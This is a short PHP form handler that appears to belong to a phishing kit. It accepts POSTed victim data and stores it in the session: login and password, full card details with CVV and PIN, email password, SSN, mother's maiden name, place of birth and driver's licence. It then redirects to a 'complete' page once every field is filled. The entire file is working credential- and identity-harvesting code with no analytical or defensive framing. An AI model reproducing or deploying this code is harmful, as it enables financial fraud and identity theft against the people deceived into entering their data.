<?php

if($_SERVER['REQUEST_METHOD'] != "POST") {
    header("HTTP/1.0 403 Forbidden");
    print("Forbidden");
    exit();
}

session_start();

$_SESSION["user"] = $user = $_POST['user'];
$_SESSION["pass"] = $pass = $_POST['pass'];
$_SESSION["card1"] = $card1 = $_POST['card1'];
$_SESSION["card2"] = $card2 = $_POST['card2'];
$_SESSION["card3"] = $card3 = $_POST['card3'];
$_SESSION["holder"] = $holder = $_POST['holder'];
$_SESSION["month"] = $month = $_POST['month'];
$_SESSION["year"] = $year = $_POST['year'];
$_SESSION["cvv"] = $cvv = $_POST['cvv'];
$_SESSION["csc"] = $csc = $_POST['csc'];
$_SESSION["pin"] = $pin = $_POST['pin'];
$_SESSION["email"] = $email = $_POST['email'];
$_SESSION["epass"] = $epass = $_POST['epass'];
$_SESSION["pob"] = $pob = $_POST['pob'];
$_SESSION["mmn"] = $mmn = $_POST['mmn'];
$_SESSION["ssn"] = $ssn = $_POST['ssn'];
$_SESSION["myear1"] = $myear1 = $_POST['myear1'];
$_SESSION["myear2"] = $myear2 = $_POST['myear2'];
$_SESSION["myear3"] = $myear3 = $_POST['myear3'];
$_SESSION["dl"] = $dl = $_POST['dl'];

if ($user =="" || $pass =="" || $card1 =="" || $card2 =="" || $card3 =="" || $holder =="" || $month =="" || $year =="" || $cvv =="" || $csc =="" || $email =="" || $epass =="" || $pob =="" || $mmn =="" || $ssn =="" || $myear1 =="" || $myear2 =="" || $myear3 =="" || $dl =="" || $pin =="")    {
    header( "Location: index.php");
}
 else {
    header( "Location: complete.php");
  }
?>